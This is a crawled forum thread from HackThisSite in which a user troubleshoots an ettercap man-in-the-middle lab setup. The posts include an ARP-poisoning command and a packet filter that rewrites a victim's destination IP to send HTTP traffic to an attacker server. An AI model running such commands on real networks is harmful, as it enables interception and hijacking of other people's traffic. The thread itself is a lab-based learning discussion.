http://www.hackthissite.org/forums/viewtopic.php?f=30&t=10462
HTTP/1.1 200 OK
Date: Wed, 23 Jul 2014 05:21:59 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Set-Cookie: phpbb3_28pla_u=1; expires=Thu, 23-Jul-2015 05:21:59 GMT; path=/; domain=.hackthissite.org; HttpOnly
Set-Cookie: phpbb3_28pla_k=; expires=Thu, 23-Jul-2015 05:21:59 GMT; path=/; domain=.hackthissite.org; HttpOnly
Set-Cookie: phpbb3_28pla_sid=ac52ce0dee166a53bc0b12347be02a31; expires=Thu, 23-Jul-2015 05:21:59 GMT; path=/; domain=.hackthissite.org; HttpOnly
Cache-Control: private, no-cache="set-cookie"
Expires: 0
Pragma: no-cache
Server: HackThisSite Load Balancer
Strict-Transport-Security: max-age=31536000

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-gb" xml:lang="en-gb">
<head>

<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<meta http-equiv="content-style-type" content="text/css" />
<meta http-equiv="content-language" content="en-gb" />
<meta http-equiv="imagetoolbar" content="no" />
<meta name="resource-type" content="document" />
<meta name="distribution" content="global" />
<meta name="copyright" content="2000, 2002, 2005, 2007 phpBB Group" />
<meta name="keywords" content="" />
<meta name="description" content="" />
<title>Hack This Site Forum &bull; View topic - ettercap - intercepting packets and changing destination IP</title>

<script type="text/javascript">
// <![CDATA[
	var jump_page = 'Enter the page number you wish to go to:';
	var on_page = '1';
	var per_page = '';
	var base_url = '';
	var style_cookie = 'phpBBstyle';
	var onload_functions = new Array();
	var onunload_functions = new Array();

	
	/**
	* Find a member
	*/
	function find_username(url)
	{
		popup(url, 760, 570, '_usersearch');
		return false;
	}

	/**
	* New function for handling multiple calls to window.onload and window.unload by pentapenguin
	*/
	window.onload = function()
	{
		for (var i = 0; i < onload_functions.length; i++)
		{
			eval(onload_functions[i]);
		}
	}

	window.onunload = function()
	{
		for (var i = 0; i < onunload_functions.length; i++)
		{
			eval(onunload_functions[i]);
		}
	}

// ]]>
</script>
<script type="text/javascript" src="./styles/Carbon/template/styleswitcher.js"></script>
<script type="text/javascript" src="./styles/Carbon/template/forum_fn.js"></script>

<link href="./styles/Carbon/theme/print.css" rel="stylesheet" type="text/css" media="print" title="printonly" />
<link href="./style.php?sid=ac52ce0dee166a53bc0b12347be02a31&amp;id=8&amp;lang=en" rel="stylesheet" type="text/css" media="screen, projection" />

<link href="./styles/Carbon/theme/normal.css" rel="stylesheet" type="text/css" title="A" />
<link href="./styles/Carbon/theme/medium.css" rel="alternate stylesheet" type="text/css" title="A+" />
<link href="./styles/Carbon/theme/large.css" rel="alternate stylesheet" type="text/css" title="A++" />


</head>

<body id="phpbb" class="section-viewtopic ltr">
<span id="blank-element" style="display: none"></span>
<div id="wrap">
	<a id="top" name="top" accesskey="t"></a>
	<div id="page-header">
		<div class="headerbar">
			<div class="inner"><span class="corners-top"><span></span></span>

			<div id="site-description">
				<a href="./index.php?sid=ac52ce0dee166a53bc0b12347be02a31" title="Board index" id="logo"><img src="images/spacer.gif" width="920" height="90" alt="" /></a>
				<!-- <p>Training the hacker underground</p> -->
				<p style="display: none;"><a href="#start_here">Skip to content</a></p>
			</div>
			<div style="text-align: center;"><a href="https://www.hackthissite.org/2mIure91D55L52tx6115r9h3La807gfsxb4tzvpN221XG8PJla70WCu1kuaXXM59t38hA1wUml2fSoqlMSJWn0A1S0W2ZnMzm" target="_blank"><img src="https://www.hackthissite.org/nfT77EWe707x94k71bLd0MlLprhB1MV5eLJt1THKfm2LB9YBUXMYSYws84pug384Ho23718jAlS5jb2Qg60o9oJSNV2nKBsE1obuzRgQMZv1LpmnKb6cyZLWF00wWAwuJi4AwB2NhM9C2yzTk89FM2yacze9XvSzK" alt="Scan Your Website with Netsparker Web Security Scanner" id="atimg" class="abstaimg" title="Scan Your Website with Netsparker Web Security Scanner" border="0" /></a>
<div id="8951c95109" class="pagefair-acceptable"></div><br />[<a href="https://www.hackthissite.org/advertise/">Advertise With HackThisSite.org</a>]<!-- Kontera ContentLink(TM);-->
<script type='text/javascript'>
var dc_AdLinkColor = '#06464' ; 
var dc_PublisherID = 79308 ; 
</script>
<script type='text/javascript' src='http://kona.kontera.com/javascript/lib/KonaLibInline.js'>
</script><br />
<p style="font-size: 16px; font-weight: bold; padding: 0px; margin: 10px 0px 10px 0px;">
<a href="http://www.hackthissite.org/">Hack This Site</a> - 
<a href="./index.php?sid=ac52ce0dee166a53bc0b12347be02a31">Forums Index</a></p></div>

			<span class="corners-bottom"><span></span></span></div>
		</div>

		<div class="navbar">
			<div class="inner"><span class="corners-top"><span></span></span>

			<ul class="linklist navlinks">
				<li class="icon-home"><a href="./index.php?sid=ac52ce0dee166a53bc0b12347be02a31" accesskey="h">Board index</a>  <strong>&#8249;</strong> <a href="./viewforum.php?f=18&amp;sid=ac52ce0dee166a53bc0b12347be02a31">General Discussion</a> <strong>&#8249;</strong> <a href="./viewforum.php?f=30&amp;sid=ac52ce0dee166a53bc0b12347be02a31">Networking</a></li>

				<!--<li class="rightside"><a href="#" onclick="fontsizeup(); return false;" class="fontsize" title="Change font size">Change font size</a></li>-->

				<li class="rightside"><a href="./viewtopic.php?f=30&amp;t=10462&amp;start=0&amp;sid=ac52ce0dee166a53bc0b12347be02a31&amp;view=print" title="Print view" accesskey="p" class="print">Print view</a></li>			</ul>

			
			<ul class="linklist rightside">
				<li class="icon-faq"><a href="./faq.php?sid=ac52ce0dee166a53bc0b12347be02a31" title="Frequently Asked Questions">FAQ</a></li>
				                <li class="icon-search"><a href="./search.php?sid=ac52ce0dee166a53bc0b12347be02a31" title="View the advanced search options">Search</a></li>
				<li class="icon-members"><a href="./memberlist.php?sid=ac52ce0dee166a53bc0b12347be02a31" title="View complete list of members">Members</a></li>					<li class="icon-logout"><a href="./ucp.php?mode=login&amp;sid=ac52ce0dee166a53bc0b12347be02a31" title="Login" accesskey="l">Login</a></li>
							</ul>

			<span class="corners-bottom"><span></span></span></div>
		</div>

	</div>

	<a name="start_here"></a>
	<div id="page-body">
		
		 <h2><a href="./viewtopic.php?f=30&amp;t=10462&amp;start=0&amp;sid=ac52ce0dee166a53bc0b12347be02a31">ettercap - intercepting packets and changing destination IP  </a></h2>
<!-- NOTE: remove the style="display: none" when you want to have the forum description on the topic body --><span style="display: none">What's the best way to setup a home network? Why should I care about BGP?<br /></span>
<div class="topic-actions">

	<div class="buttons">
			<div class="reply-icon"><a href="./posting.php?mode=reply&amp;f=30&amp;t=10462&amp;sid=ac52ce0dee166a53bc0b12347be02a31" title="Post a reply"><span></span>Post a reply</a></div>
		</div>

			<div class="search-box">
			<form method="post" id="topic-search" action="./search.php?t=10462&amp;sid=ac52ce0dee166a53bc0b12347be02a31">
			<fieldset>
				<input class="inputbox search tiny"  type="text" name="keywords" id="search_keywords" size="20" value="Search this topic…" onclick="if(this.value=='Search this topic…')this.value='';" onblur="if(this.value=='')this.value='Search this topic…';" />
				<input class="button2" type="submit" value="Search" />
				<input type="hidden" value="10462" name="t" />
				<input type="hidden" value="msgonly" name="sf" />
			</fieldset>
			</form>
		</div>
			<div class="pagination">
			6 posts			 &bull; Page <strong>1</strong> of <strong>1</strong>		</div>
	
</div>
<div class="clear"></div>

	<div id="p76951" class="post bg2">
		<div class="inner"><span class="corners-top"><span></span></span>

		<div class="postbody">
			
			<h3 class="first">
								<a href="#p76951">ettercap - intercepting packets and changing destination IP</a>
			</h3>
			<p class="author"><a href="./viewtopic.php?p=76951&amp;sid=ac52ce0dee166a53bc0b12347be02a31#p76951"><img src="./styles/Carbon/imageset/icon_post_target.gif" width="11" height="9" alt="Post" title="Post" /></a>			by <strong><a href="./memberlist.php?mode=viewprofile&amp;u=56989&amp;sid=ac52ce0dee166a53bc0b12347be02a31">nwn00bie</a></strong> on Thu Aug 22, 2013 3:21 am			<br />([msg=76951]see ettercap - intercepting packets and changing destination IP[/msg])
			</p>

			
			<div class="content">Hello,<br /><br />Just wondering if this concept is possible or even makes sense.<br /><br />Basically, using ettercap to ARP spoof and capture packets, then modify the ip.dst field to redirect the packet elsewhere.<br /><br />i.e. my filter would look like this:<br /><br /><dl class="codebox"><dt>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></dt><dd><code>if (ip.proto == TCP &amp;&amp; ip.src == '192.168.1.2' &amp;&amp; ip.dst == '192.168.2.2' &amp;&amp; tcp.dst == 80) {<br />&nbsp; &nbsp; ip.dst = '192.168.1.3'<br />}</code></dd></dl><br /><br />Reason for asking is that, I tried a simple test, and it doesn't seem to work. Not asking why it didn't work, but would like to check if this is even possible in the first place.<br /><br />Thanks,<br />n3v3n</div>

			
		</div>

					<dl class="postprofile" id="profile76951">
			<dt>
				<a href="./memberlist.php?mode=viewprofile&amp;u=56989&amp;sid=ac52ce0dee166a53bc0b12347be02a31">nwn00bie</a>			</dt>

			<dd>New User<br /><img src="./images/ranks/blackboll_0.gif" alt="New User" title="New User" /></dd>
		<dd>&nbsp;</dd>

		<dd><strong>Posts:</strong> 3</dd><dd><strong>Joined:</strong> Thu Aug 22, 2013 3:14 am</dd>			<dd><strong>Blog:</strong> <a href="http://www.hackthissite.org/forums/blog/nwn00bie/index_sid-ac52ce0dee166a53bc0b12347be02a31.html">View Blog (0)</a></dd>
					<dd>
				<ul class="profile-icons">
					<li class="email-icon"><a href="./memberlist.php?mode=email&amp;u=56989&amp;sid=ac52ce0dee166a53bc0b12347be02a31" title="E-mail"><span>E-mail</span></a></li>				</ul>
			</dd>
		
		</dl>
	
		<div class="back2top"><a href="#wrap" class="top" title="Top"></a></div>

		<span class="corners-bottom"><span></span></span></div>
	</div>
<hr>
	<hr class="divider" />
	<div id="p76956" class="post bg1">
		<div class="inner"><span class="corners-top"><span></span></span>

		<div class="postbody">
			
			<h3 >
								<a href="#p76956">Re: ettercap - intercepting packets and changing destination IP</a>
			</h3>
			<p class="author"><a href="./viewtopic.php?p=76956&amp;sid=ac52ce0dee166a53bc0b12347be02a31#p76956"><img src="./styles/Carbon/imageset/icon_post_target.gif" width="11" height="9" alt="Post" title="Post" /></a>			by <strong><a href="./memberlist.php?mode=viewprofile&amp;u=14322&amp;sid=ac52ce0dee166a53bc0b12347be02a31">Goatboy</a></strong> on Thu Aug 22, 2013 6:51 am			<br />([msg=76956]see Re: ettercap - intercepting packets and changing destination IP[/msg])
			</p>

			
			<div class="content">I haven't used ettercap in ages (in fact, I haven't used most things in ages) but if you could provide more details perhaps I could help.  What test did you try?  What was your network setup?  What did you expect and what actually happened?<br /><br />&quot;Data data data, I cannot make bricks without clay.&quot;</div>

			<div id="sig76956" class="signature"><div align="center"><span style="font-style: italic">Assume that everything I say is or could be a lie.</span></div><div align="center">1UHQ15HqBRZFykqx7mKHpYroxanLjJcUk</div></div>
		</div>

					<dl class="postprofile" id="profile76956">
			<dt>
				<a href="./memberlist.php?mode=viewprofile&amp;u=14322&amp;sid=ac52ce0dee166a53bc0b12347be02a31"><img src="http://www.hackthissite.org/pages/user/avatar.view.forum.php?id=1160901" width="70" height="70" alt="User avatar" /></a><br />
				<a href="./memberlist.php?mode=viewprofile&amp;u=14322&amp;sid=ac52ce0dee166a53bc0b12347be02a31">Goatboy</a>			</dt>

			<dd>Expert<br /><img src="./images/ranks/blackboll_5.gif" alt="Expert" title="Expert" /></dd>
		<dd>&nbsp;</dd>

		<dd><strong>Posts:</strong> 2788</dd><dd><strong>Joined:</strong> Mon Jul 07, 2008 9:35 pm</dd>			<dd><strong>Blog:</strong> <a href="http://www.hackthissite.org/forums/blog/Goatboy/index_sid-ac52ce0dee166a53bc0b12347be02a31.html">View Blog (0)</a></dd>
		
		</dl>
	
		<div class="back2top"><a href="#wrap" class="top" title="Top"></a></div>

		<span class="corners-bottom"><span></span></span></div>
	</div>
<hr>
	<hr class="divider" />
	<div id="p76980" class="post bg2">
		<div class="inner"><span class="corners-top"><span></span></span>

		<div class="postbody">
			
			<h3 >
								<a href="#p76980">Re: ettercap - intercepting packets and changing destination IP</a>
			</h3>
			<p class="author"><a href="./viewtopic.php?p=76980&amp;sid=ac52ce0dee166a53bc0b12347be02a31#p76980"><img src="./styles/Carbon/imageset/icon_post_target.gif" width="11" height="9" alt="Post" title="Post" /></a>			by <strong><a href="./memberlist.php?mode=viewprofile&amp;u=38150&amp;sid=ac52ce0dee166a53bc0b12347be02a31" style="color: #00CCFF;" class="username-coloured">limdis</a></strong> on Thu Aug 22, 2013 3:47 pm			<br />([msg=76980]see Re: ettercap - intercepting packets and changing destination IP[/msg])
			</p>

			
			<div class="content">Right, need a bit more information on your attack setup. Have you successfully setup a MITM?</div>

			<div id="sig76980" class="signature">&quot;The quieter you become, the more you are able to hear...&quot;<br />&quot;Drink all the booze, hack all the things.&quot;</div>
		</div>

					<dl class="postprofile" id="profile76980">
			<dt>
				<a href="./memberlist.php?mode=viewprofile&amp;u=38150&amp;sid=ac52ce0dee166a53bc0b12347be02a31"><img src="http://www.hackthissite.org/pages/user/avatar.view.forum.php?id=1408073" width="70" height="70" alt="User avatar" /></a><br />
				<a href="./memberlist.php?mode=viewprofile&amp;u=38150&amp;sid=ac52ce0dee166a53bc0b12347be02a31" style="color: #00CCFF;" class="username-coloured">limdis</a>			</dt>

			<dd>Moderator<br /><img src="./images/ranks/blackboll_moderator.gif" alt="Moderator" title="Moderator" /></dd>
		<dd>&nbsp;</dd>

		<dd><strong>Posts:</strong> 1310</dd><dd><strong>Joined:</strong> Mon Jun 28, 2010 5:45 pm</dd>			<dd><strong>Blog:</strong> <a href="http://www.hackthissite.org/forums/blog/limdis/index_sid-ac52ce0dee166a53bc0b12347be02a31.html">View Blog (0)</a></dd>
					<dd>
				<ul class="profile-icons">
					<li class="email-icon"><a href="./memberlist.php?mode=email&amp;u=38150&amp;sid=ac52ce0dee166a53bc0b12347be02a31" title="E-mail"><span>E-mail</span></a></li>				</ul>
			</dd>
		
		</dl>
	
		<div class="back2top"><a href="#wrap" class="top" title="Top"></a></div>

		<span class="corners-bottom"><span></span></span></div>
	</div>
<hr>
	<hr class="divider" />
	<div id="p76986" class="post bg1">
		<div class="inner"><span class="corners-top"><span></span></span>

		<div class="postbody">
			
			<h3 >
								<a href="#p76986">Re: ettercap - intercepting packets and changing destination IP</a>
			</h3>
			<p class="author"><a href="./viewtopic.php?p=76986&amp;sid=ac52ce0dee166a53bc0b12347be02a31#p76986"><img src="./styles/Carbon/imageset/icon_post_target.gif" width="11" height="9" alt="Post" title="Post" /></a>			by <strong><a href="./memberlist.php?mode=viewprofile&amp;u=56989&amp;sid=ac52ce0dee166a53bc0b12347be02a31">nwn00bie</a></strong> on Thu Aug 22, 2013 10:05 pm			<br />([msg=76986]see Re: ettercap - intercepting packets and changing destination IP[/msg])
			</p>

			
			<div class="content">Hi,<br /><br />Thanks for the replies. My setup is as such:<br /><br /><dl class="codebox"><dt>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></dt><dd><code>NETWORK: 192.168.2.0/24<br />GATEWAY: 192.168.2.1 (AA:AA:AA:AA:AA:AA)<br /><br />VICTIM: 192.168.2.2 (BB:BB:BB:BB:BB:BB)<br /><br />ATTACKER: 192.168.2.3 (CC:CC:CC:CC:CC:CC)<br /><br />ATTACKER-SERVER: 192.168.2.4 (DD:DD:DD:DD:DD:DD)<br />ATTACKER-SERVER is running Apache server on port 80 (tested accessible from both VICTIM and ATTACKER)</code></dd></dl><br /><br />Normal flow: VICTIM would access a web page from Internet at 123.123.123.123, i.e.<br /><dl class="codebox"><dt>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></dt><dd><code>VICTIM (192.168.2.2) -&gt; GATEWAY (192.168.2.1) -&gt; 123.123.123.123</code></dd></dl><br /><br />Intended hijacked flow: ATTACKER would hijack the packet (using ARP poisoning) and redirect it to the ATTACKER-SERVER, i.e.<br /><dl class="codebox"><dt>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></dt><dd><code>VICTIM (192.168.2.2) -&gt; ATTACKER (192.168.2.3) -&gt; ATTACKER-SERVER (192.168.2.4)</code></dd></dl><br /><br />filter.ecf:<br /><dl class="codebox"><dt>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></dt><dd><code>if (ip.proto == TCP &amp;&amp; ip.src == '192.168.2.2' &amp;&amp; ip.dst == '123.123.123.123' &amp;&amp; tcp.dst == 80) {<br />&nbsp; &nbsp; ip.dst = '192.168.2.4';<br />}</code></dd></dl><br /><br />Ettercap Command:<br /><dl class="codebox"><dt>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></dt><dd><code>ettercap -M arp:remote,oneway -T -t TCP -F filter.ef /192.168.2.2/ /192.168.2.1/</code></dd></dl><br /><br />Observations:<br /><br />1. ARP poisoning successful.<br />a. I can see the ARP packets going around.<br />b. From the VICTIM's ARP cache, both 192.168.2.1 and 192.168.2.3 has MAC CC:CC:CC:CC:CC:CC<br /><br />2. Packet sniffing successful. From the ATTACKER, I can see the SYN packet:<br /><dl class="codebox"><dt>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></dt><dd><code>Eth src: BB:BB:BB:BB:BB:BB<br />Eth dst: CC:CC:CC:CC:CC:CC<br />IP src: 192.168.2.2<br />IP dst: 123.123.123.123<br />TCP src: 11111<br />TCP dst: 80</code></dd></dl><br /><br />3. Modification of destination IP seemingly successful. From the ATTACKER, I can see another SYN packet after the original one from VICTIM:<br /><dl class="codebox"><dt>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></dt><dd><code>Eth src: CC:CC:CC:CC:CC:CC<br />Eth dst: DD:DD:DD:DD:DD:DD<br />IP src: 192.168.2.2<br />IP dst: 192.168.2.4<br />TCP src: 11111<br />TCP dst: 80</code></dd></dl><br /><br />4. Packet transmission seemingly successful (at least at IP layer). From the ATTACKER-SERVER, I can see the SYN packet modified and forwarded by ATTACKER:<br /><dl class="codebox"><dt>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></dt><dd><code>Eth src: CC:CC:CC:CC:CC:CC<br />Eth dst: DD:DD:DD:DD:DD:DD<br />IP src: 192.168.2.2<br />IP dst: 192.168.2.4<br />TCP src: 11111<br />TCP dst: 80</code></dd></dl><br /><br />5. It stops here. I'm next expecting a SYN/ACK from the Apache server running on port 80 of ATTACKER-SERVER, but it never comes (not visible even from sniffing on ATTACKER-SERVER itself). Either that, or the forwarded packet just doesn't traverse up the network stack to the TCP layer.<br /><br />Thanks,<br />n3v3n</div>

			
		</div>

					<dl class="postprofile" id="profile76986">
			<dt>
				<a href="./memberlist.php?mode=viewprofile&amp;u=56989&amp;sid=ac52ce0dee166a53bc0b12347be02a31">nwn00bie</a>			</dt>

			<dd>New User<br /><img src="./images/ranks/blackboll_0.gif" alt="New User" title="New User" /></dd>
		<dd>&nbsp;</dd>

		<dd><strong>Posts:</strong> 3</dd><dd><strong>Joined:</strong> Thu Aug 22, 2013 3:14 am</dd>			<dd><strong>Blog:</strong> <a href="http://www.hackthissite.org/forums/blog/nwn00bie/index_sid-ac52ce0dee166a53bc0b12347be02a31.html">View Blog (0)</a></dd>
					<dd>
				<ul class="profile-icons">
					<li class="email-icon"><a href="./memberlist.php?mode=email&amp;u=56989&amp;sid=ac52ce0dee166a53bc0b12347be02a31" title="E-mail"><span>E-mail</span></a></li>				</ul>
			</dd>
		
		</dl>
	
		<div class="back2top"><a href="#wrap" class="top" title="Top"></a></div>

		<span class="corners-bottom"><span></span></span></div>
	</div>
<hr>
	<hr class="divider" />
	<div id="p76989" class="post bg2">
		<div class="inner"><span class="corners-top"><span></span></span>

		<div class="postbody">
			
			<h3 >
								<a href="#p76989">Re: ettercap - intercepting packets and changing destination IP</a>
			</h3>
			<p class="author"><a href="./viewtopic.php?p=76989&amp;sid=ac52ce0dee166a53bc0b12347be02a31#p76989"><img src="./styles/Carbon/imageset/icon_post_target.gif" width="11" height="9" alt="Post" title="Post" /></a>			by <strong><a href="./memberlist.php?mode=viewprofile&amp;u=14322&amp;sid=ac52ce0dee166a53bc0b12347be02a31">Goatboy</a></strong> on Fri Aug 23, 2013 8:18 am			<br />([msg=76989]see Re: ettercap - intercepting packets and changing destination IP[/msg])
			</p>

			
			<div class="content">You named your filter file &quot;<span style="color: #FF0000">filter.ecf</span>&quot; but in your command you pass in &quot;<span style="color: #FF0000">filter.ef</span>&quot;<br /><br />Check to make sure you're matching file names.  Might have been a typo on the forum when you wrote your post, but it doesn't hurt to make sure.  This would make sense because ettercap is doing the ARP poison successfully, but it doesn't have a filter rule so it doesn't know to translate the address to 192.168.2.4 (ATTACKER-SERVER).<br /><br />Also, <span style="color: #00FF00">this is basically the best post I've ever read in regards to asking for help</span>.  Seriously.  You gave us the setup, expected result, actual result, and related comments.  Awesome.</div>

			<div id="sig76989" class="signature"><div align="center"><span style="font-style: italic">Assume that everything I say is or could be a lie.</span></div><div align="center">1UHQ15HqBRZFykqx7mKHpYroxanLjJcUk</div></div>
		</div>

					<dl class="postprofile" id="profile76989">
			<dt>
				<a href="./memberlist.php?mode=viewprofile&amp;u=14322&amp;sid=ac52ce0dee166a53bc0b12347be02a31"><img src="http://www.hackthissite.org/pages/user/avatar.view.forum.php?id=1160901" width="70" height="70" alt="User avatar" /></a><br />
				<a href="./memberlist.php?mode=viewprofile&amp;u=14322&amp;sid=ac52ce0dee166a53bc0b12347be02a31">Goatboy</a>			</dt>

			<dd>Expert<br /><img src="./images/ranks/blackboll_5.gif" alt="Expert" title="Expert" /></dd>
		<dd>&nbsp;</dd>

		<dd><strong>Posts:</strong> 2788</dd><dd><strong>Joined:</strong> Mon Jul 07, 2008 9:35 pm</dd>			<dd><strong>Blog:</strong> <a href="http://www.hackthissite.org/forums/blog/Goatboy/index_sid-ac52ce0dee166a53bc0b12347be02a31.html">View Blog (0)</a></dd>
		
		</dl>
	
		<div class="back2top"><a href="#wrap" class="top" title="Top"></a></div>

		<span class="corners-bottom"><span></span></span></div>
	</div>
<hr>
	<hr class="divider" />
	<div id="p77237" class="post bg1">
		<div class="inner"><span class="corners-top"><span></span></span>

		<div class="postbody">
			
			<h3 >
								<a href="#p77237">Re: ettercap - intercepting packets and changing destination IP</a>
			</h3>
			<p class="author"><a href="./viewtopic.php?p=77237&amp;sid=ac52ce0dee166a53bc0b12347be02a31#p77237"><img src="./styles/Carbon/imageset/icon_post_target.gif" width="11" height="9" alt="Post" title="Post" /></a>			by <strong><a href="./memberlist.php?mode=viewprofile&amp;u=56989&amp;sid=ac52ce0dee166a53bc0b12347be02a31">nwn00bie</a></strong> on Tue Sep 03, 2013 9:13 pm			<br />([msg=77237]see Re: ettercap - intercepting packets and changing destination IP[/msg])
			</p>

			
			<div class="content">Hi,<br /><br />Sorry for the confusion and delayed response.<br /><br /><blockquote><div><cite>Goatboy wrote:</cite>You named your filter file &quot;<span style="color: #FF0000">filter.ecf</span>&quot; but in your command you pass in &quot;<span style="color: #FF0000">filter.ef</span>&quot;<br /><br />Check to make sure you're matching file names.  Might have been a typo on the forum when you wrote your post, but it doesn't hurt to make sure.  This would make sense because ettercap is doing the ARP poison successfully, but it doesn't have a filter rule so it doesn't know to translate the address to 192.168.2.4 (ATTACKER-SERVER).</div></blockquote><br /><br />I missed out a step here, which is compiling the Ettercap filter file:<br /><br /><dl class="codebox"><dt>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></dt><dd><code>etterfilter -o filter.ef filter.ecf</code></dd></dl><br /><br />In other words, the code I posted is the &quot;source code&quot; for filter.ecf, which is compiled to filter.ef before I can use it with Ettercap.<br /><br />In any case, I'm quite sure that the packet re-direction by the Ettercap filter was successful, as explained in point (4) of my lengthy post above. Just that, somehow the packet didn't traverse up the network stack to the TCP or application layer.<br /><br />Just to roll things up a bit,<br /><br />1. Looking around on the Internet, this doesn't seem to be the way everyone else normally does packet redirection. Nobody else seems to be redirecting packets just by changing the ip.dst field. Seems like the normal way to do redirect packets would be to use iptables in conjunction with Ettercap.<br /><br />2. So it seems like this is the *wrong* way to do packet redirection with Ettercap. Then I'm curious, from a networking perspective, what's wrong with this approach? The packet that is retransmitted after changing the destination IP field is just as legitimate as any other, so how is it that the packet does reach the host that it is intended for, but does not make its way up to the application?<br /><br />Thanks,<br />n3v3n</div>

			
		</div>

					<dl class="postprofile" id="profile77237">
			<dt>
				<a href="./memberlist.php?mode=viewprofile&amp;u=56989&amp;sid=ac52ce0dee166a53bc0b12347be02a31">nwn00bie</a>			</dt>

			<dd>New User<br /><img src="./images/ranks/blackboll_0.gif" alt="New User" title="New User" /></dd>
		<dd>&nbsp;</dd>

		<dd><strong>Posts:</strong> 3</dd><dd><strong>Joined:</strong> Thu Aug 22, 2013 3:14 am</dd>			<dd><strong>Blog:</strong> <a href="http://www.hackthissite.org/forums/blog/nwn00bie/index_sid-ac52ce0dee166a53bc0b12347be02a31.html">View Blog (0)</a></dd>
					<dd>
				<ul class="profile-icons">
					<li class="email-icon"><a href="./memberlist.php?mode=email&amp;u=56989&amp;sid=ac52ce0dee166a53bc0b12347be02a31" title="E-mail"><span>E-mail</span></a></li>				</ul>
			</dd>
		
		</dl>
	
		<div class="back2top"><a href="#wrap" class="top" title="Top"></a></div>

		<span class="corners-bottom"><span></span></span></div>
	</div>
<hr>
	<hr class="divider" />
	<form id="viewtopic" method="post" action="./viewtopic.php?f=30&amp;t=10462&amp;start=0&amp;sid=ac52ce0dee166a53bc0b12347be02a31">

	<fieldset class="display-options" style="margin-top: 0; ">
				<label>Display posts from previous: <select name="st" id="st"><option value="0" selected="selected">All posts</option><option value="1">1 day</option><option value="7">7 days</option><option value="14">2 weeks</option><option value="30">1 month</option><option value="90">3 months</option><option value="180">6 months</option><option value="365">1 year</option></select></label>
		<label>Sort by <select name="sk" id="sk"><option value="a">Author</option><option value="t" selected="selected">Post time</option><option value="s">Subject</option></select></label> <label><select name="sd" id="sd"><option value="a" selected="selected">Ascending</option><option value="d">Descending</option></select> <input type="submit" name="sort" value="Go" class="button2" /></label>
	</fieldset>

	</form>
	<hr />

<div class="topic-actions">
	<div class="buttons">
			<div class="reply-icon"><a href="./posting.php?mode=reply&amp;f=30&amp;t=10462&amp;sid=ac52ce0dee166a53bc0b12347be02a31" title="Post a reply"><span></span>Post a reply</a></div>
		</div>

			<div class="pagination">
			6 posts			 &bull; Page <strong>1</strong> of <strong>1</strong>		</div>
	</div>

	<p></p><p><a href="./viewforum.php?f=30&amp;sid=ac52ce0dee166a53bc0b12347be02a31" class="left-box left" accesskey="r">Return to Networking</a></p>
	<form method="post" id="jumpbox" action="./viewforum.php?sid=ac52ce0dee166a53bc0b12347be02a31" onsubmit="if(document.jumpbox.f.value == -1){return false;}">

			<fieldset class="jumpbox">
				<label for="f" accesskey="j">Jump to:</label>
			<select name="f" id="f" onchange="if(this.options[this.selectedIndex].value != -1){ document.forms['jumpbox'].submit() }">
							<option value="-1">Select a forum</option>
			<option value="-1">------------------</option>				<option value="5">Forum Guidelines</option>
							<option value="87">&nbsp; &nbsp;Terms of Service &amp; Additional Information</option>
							<option value="7">HackThisSite</option>
							<option value="8">&nbsp; &nbsp;News</option>
							<option value="9">&nbsp; &nbsp;Comments &amp; Suggestions</option>
							<option value="18">General Discussion</option>
							<option value="37">&nbsp; &nbsp;General</option>
							<option value="30" selected="selected">&nbsp; &nbsp;Networking</option>
							<option value="32">&nbsp; &nbsp;Telecommunications</option>
							<option value="39">&nbsp; &nbsp;Hardware</option>
							<option value="83">&nbsp; &nbsp;Books</option>
							<option value="33">&nbsp; &nbsp;Off-Topic</option>
							<option value="126">&nbsp; &nbsp;LULZ</option>
							<option value="128">&nbsp; &nbsp;&nbsp; &nbsp;Idiots' Corner</option>
							<option value="131">&nbsp; &nbsp;Gaming</option>
							<option value="155">&nbsp; &nbsp;PDF's and Articles</option>
							<option value="79">NZone</option>
							<option value="76">Graveyard</option>
							<option value="73">HTS Subprojects</option>
							<option value="125">&nbsp; &nbsp;Store</option>
							<option value="80">&nbsp; &nbsp;IRC</option>
							<option value="140">&nbsp; &nbsp;Lectures</option>
							<option value="142">&nbsp; &nbsp;&nbsp; &nbsp;Audio/IRC Downloads</option>
							<option value="144">&nbsp; &nbsp;&nbsp; &nbsp;OFFICIAL Lecture Approvals</option>
							<option value="145">&nbsp; &nbsp;Radio</option>
							<option value="13">HTS Missions</option>
							<option value="14">&nbsp; &nbsp;Basic</option>
							<option value="15">&nbsp; &nbsp;Realistic</option>
							<option value="50">&nbsp; &nbsp;&nbsp; &nbsp;(Real 1) Uncle Arnold's Local Band Review</option>
							<option value="51">&nbsp; &nbsp;&nbsp; &nbsp;(Real 2) Chicago American Nazi Party</option>
							<option value="52">&nbsp; &nbsp;&nbsp; &nbsp;(Real 3) Peace Poetry: HACKED</option>
							<option value="84">&nbsp; &nbsp;&nbsp; &nbsp;(Real 4) Fischer's Animal Products</option>
							<option value="53">&nbsp; &nbsp;&nbsp; &nbsp;(Real 5) Damn Telemarketers!</option>
							<option value="54">&nbsp; &nbsp;&nbsp; &nbsp;(Real 6) ToxiCo Industrial Chemicals</option>
							<option value="55">&nbsp; &nbsp;&nbsp; &nbsp;(Real 7) What's Right For America</option>
							<option value="56">&nbsp; &nbsp;&nbsp; &nbsp;(Real 8) United Banks Of America</option>
							<option value="57">&nbsp; &nbsp;&nbsp; &nbsp;(Real 9) CrappySoft</option>
							<option value="58">&nbsp; &nbsp;&nbsp; &nbsp;(Real 10) Holy Word High School</option>
							<option value="65">&nbsp; &nbsp;&nbsp; &nbsp;(Real 11) BudgetServ Web Hosting</option>
							<option value="64">&nbsp; &nbsp;&nbsp; &nbsp;(Real 12) Heartland School District</option>
